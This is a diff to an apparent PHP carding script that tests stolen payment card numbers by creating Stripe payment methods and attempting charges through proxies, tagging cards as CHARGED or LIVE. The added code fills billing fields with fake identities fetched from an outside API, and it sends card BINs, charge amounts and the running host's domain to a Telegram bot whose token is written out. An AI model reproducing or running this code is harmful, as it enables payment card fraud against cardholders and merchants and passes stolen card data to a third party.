@@ -5,6 +5,24 @@ $timezones = timezone_identifiers_list();
 $random_timezone = $timezones[array_rand($timezones)];
 date_default_timezone_set($random_timezone);
 
+// Random information API
+$resp = file_get_contents("https://lehikasa.online/random/?xiao=us");
+$a = json_decode($resp);
+$full_name  = $a->hello->person->full_name ?? "Alice Schuberg";
+$name = $a->hello->person->first_name ?? "xiao";
+$lname  = $a->hello->person->last_name ?? "tempest";
+$phone      = $a->hello->person->phone;
+$ua         = $a->hello->person->ua;
+$street     = $a->hello->street->name ?? "314 alden ave";
+$city       = $a->hello->street->city ?? "rohnert park";
+$zip        = $a->hello->street->zip ?? "94928";
+$state      = $a->hello->street->state ?? "CA";
+$state_full = $a->hello->street->state_full ?? "California";
+$regionId   = $a->hello->street->regionId ?? "12";
+$country    = $a->hello->street->country ?? "United States";
+$fivenums   = rand(1000, 9999); // Generate 5 random numbers
+
+
 //================ [ FUNCTIONS & LISTA ] ===============//
 
 function GetStr($string, $start, $end){
@@ -41,6 +59,8 @@ $hydra = $_GET['hydra'];
 $ip = $_GET['ip'];
 $proxy = ''.$ip.'';
 $proxyauth = ''.$hydra.'';
+
+$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url);
@@ -80,7 +100,7 @@ curl_setopt($ch, CURLOPT_PROXY, $proxy);
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_POST, 1);
-$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Alice+Schuberg&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]=5381+Smith+Rd&billing_details[address][city]=Cromwell&billing_details[address][postal_code]=94554&billing_details[address][state]=MN&guid=e3180ce0-937d-41a5-a49b-34554202be6396cd52&muid=91670c3f-fc9d-417a-ad5b-55b56e3858e828a431&sid=f2b8e6cd-0795-4bcf-8439-b74dd87132b090531f&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
+$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state.'&guid=e3180ce0-937d-41a5-a49b-34554202be6396cd52&muid=91670c3f-fc9d-417a-ad5b-55b56e3858e828a431&sid=f2b8e6cd-0795-4bcf-8439-b74dd87132b090531f&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
 
 $headers = array();
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
@@ -201,6 +221,7 @@ curl_close($ch);
 
 $result2;
 $dcode2 = json_decode($result2)->last_payment_error->decline_code;
+$currency = json_decode($result2)->currency;
 
 //* Start of getting BIN Information *//
 
@@ -283,10 +304,25 @@ if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
     $scheme = '';
 }
 
- #############SUCCEEDED SUCCESS
+#############SEND TO YOUR TG BOT THE CHARGED CCs AND LIVE CVVs/CCNs
+$url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=Successfull Checkout%0A%0A%0ABIN: '.$lista.'%0AURL: '.$success.'%0AAmount: '.strtoupper($currency).' '.($xamount / 100).'%0AChecked from:%0A'.$domain.'';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$sendtobot = curl_exec($ch);
+curl_close($ch);
+
+$url = 'https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text=INSUFFICIENT FUND%0A%0A%0ABIN: '.$lista.'%0AAttempted to charge the amount for a total of '.strtoupper($currency).' '.($xamount / 100).'%0AChecked from:%0A'.$domain.'';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$insuf_sendtobot = curl_exec($ch);
+curl_close($ch);
+
+#############SUCCEEDED SUCCESS
  if (strpos($result1, '"status": "succeeded"')) {
-    file_get_contents('https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text='.$lista.' => Successfull Checkout => '.$success.'');
     echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'>[ receipt here ]</a> -Alice Schuberg</span><br>";
+        $sendtobot;
     exit();
 }
 #############DECLINECODEcurl0
@@ -308,8 +344,8 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($curl0, '"insufficient_funds"')) {
-    file_get_contents('https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text='.$card.' => insufficient_funds');
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
+        $insuf_sendtobot;
     exit();
 }
 
@@ -343,8 +379,8 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($curl1, '"insufficient_funds"')) {
-    file_get_contents('https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text='.$card.' => insufficient_funds');
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
+        $insuf_sendtobot;
     exit();
 }
 
@@ -374,8 +410,8 @@ elseif($tos == "required") {
     exit();
 }
 if (strpos($result1, '"insufficient_funds"')) {
-    file_get_contents('https://api.telegram.org/bot5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw/sendMessage?chat_id=-1001808253666&text='.$card.' => insufficient_funds');
     echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status</span><br>";
+        $insuf_sendtobot;
     exit();
 }
 
